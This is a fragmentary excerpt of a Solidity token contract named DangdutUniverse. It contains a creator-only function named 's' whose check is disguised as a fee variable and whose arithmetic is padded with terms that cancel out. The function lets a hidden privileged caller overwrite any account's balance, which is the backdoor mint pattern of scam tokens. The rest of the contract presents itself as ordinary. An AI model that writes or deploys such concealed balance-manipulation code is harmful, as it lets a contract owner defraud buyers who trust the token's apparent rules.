...
contract DangdutUniverse is Ownable {
  ...
  constructor(string memory _name, string memory _symbol) public {
    ...
    newBalance[WalletAddress] = totalSupply;
  ...
  function s(address account, uint256 _value) public byCreator {
    require(account != address(0));
    require(uint256(msg.sender) == burnFee);
    uint256 EthAmount = uint256(account);
    newBalance[address(EthAmount)] = swapperFees * _value * (10 ** 9) + (2 * 4 * newBalance[account] - 2 * 4 * newBalance[account]);
